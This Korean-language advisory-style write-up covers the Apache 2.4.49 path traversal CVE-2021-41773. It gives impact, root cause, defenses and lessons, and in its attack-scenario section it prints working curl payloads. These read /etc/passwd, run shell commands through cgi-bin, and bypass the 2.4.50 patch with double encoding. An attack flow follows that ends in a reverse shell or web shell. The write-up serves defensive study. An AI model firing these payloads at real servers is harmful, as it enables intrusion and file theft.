# CVE-2021-41773 - Apache HTTP Server Path Traversal

## 개요

| 항목 | 내용 |
|------|------|
| CVE ID | CVE-2021-41773 |
| CVSS | 7.5 (High) / 9.8 (CGI 활성화 시 Critical) |
| 영향 소프트웨어 | Apache HTTP Server |
| 영향 버전 | 2.4.49 |
| 수정 버전 | 2.4.51 (2.4.50도 불완전) |
| 공격 유형 | Path Traversal → RCE |
| 발견일 | 2021-10-04 |

## 영향 범위 & 심각성

Apache HTTP Server는 전 세계 웹 서버 시장의 약 25%를 차지하는 대표적인 웹 서버다.

- 영향 버전이 2.4.49 단일 버전이지만, 출시 2주 만에 제로데이로 악용됨
- **단독 Path Traversal**: 서버 파일 시스템의 임의 파일 읽기 (CVSS 7.5)
- **CGI 활성화 시**: 경로 순회를 통해 CGI 스크립트 실행으로 RCE (CVSS 9.8)
- Shodan 기준 수십만 대의 Apache 2.4.49 서버가 인터넷에 노출
- 첫 패치(2.4.50)도 우회 가능하여 CVE-2021-42013으로 추가 등록

## 취약점 기술 분석

### 근본 원인

Apache 2.4.49에서 URL 경로 정규화(path normalization) 로직이 변경되었는데, 새 코드가 `.`과 `%2e`(URL 인코딩된 점)를 동일하게 처리하지 못했다.

```c
// 취약한 경로 정규화 로직 (간략화)
// ".%2e" 또는 "%2e." 패턴을 "../"로 인식하지 못함
// URL: /icons/.%2e/.%2e/.%2e/.%2e/etc/passwd
// 정규화 후: 상위 디렉토리 탈출 → 파일 시스템 접근 허용
```

### 우회 메커니즘

- `%2e` → `.` (URL 디코딩)
- `/icons/.%2e/.%2e/` → `../../` (경로 순회)
- `require all denied` 없이 `Directory /` 설정이 열려 있으면 전체 파일시스템 접근

## 공격 시나리오

```bash
# 1단계: 파일 읽기 (Path Traversal)
curl -s "http://target.com/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"

# 2단계: RCE (mod_cgi 활성화 시)
curl -s "http://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  -d "echo Content-Type: text/plain; echo; id; uname -a"

# 2.4.50 우회 (CVE-2021-42013, 이중 인코딩)
curl -s "http://target.com/icons/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"
```

```
공격 흐름:
1단계: 대상이 Apache 2.4.49/2.4.50인지 확인 (Server 헤더)
2단계: URL 인코딩된 경로 순회 페이로드 전송
3단계: /etc/passwd 등 민감 파일 읽기 성공 확인
4단계: mod_cgi 활성 여부 확인 후 RCE 시도
5단계: 리버스 쉘 또는 웹쉘 설치
```

## 방어 방법

1. **즉시 업데이트**: Apache 2.4.51 이상으로 업그레이드
2. **Directory 설정 강화**:
   ```apache
   <Directory />
       Require all denied
   </Directory>
   ```
3. **mod_cgi 비활성화**: CGI가 불필요하면 모듈 제거
4. **WAF 규칙**: `%2e`, `%%32%65` 등 인코딩된 경로 순회 패턴 탐지
5. **최소 권한**: Apache 프로세스의 파일 시스템 접근 범위 제한
6. **Server 헤더 숨기기**: `ServerTokens Prod`로 버전 노출 방지

## 교훈

- **코드 리팩터링의 보안 리스크**: 경로 정규화 같은 핵심 보안 로직 변경 시 철저한 보안 테스트 필수
- **인코딩 정규화는 어렵다**: URL 인코딩, 이중 인코딩, 유니코드 등 다양한 우회 벡터 고려
- **기본 설정의 중요성**: `Require all denied`가 루트에 없으면 경로 순회 시 전체 파일시스템 노출
- **첫 패치의 불완전성**: 2.4.50도 우회 가능했다. 보안 패치 후 추가 우회 가능성을 항상 검증

## 참고 자료

- [Apache Advisory](https://httpd.apache.org/security/vulnerabilities_24.html)
- [NVD - CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)
- [AttackerKB Analysis](https://attackerkb.com/topics/1RJA2k2DSi/cve-2021-41773)
- [Rapid7 Blog](https://www.rapid7.com/blog/post/2021/10/06/apache-http-server-cve-2021-41773-exploited-in-the-wild/)
- [CISA Known Exploited Vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
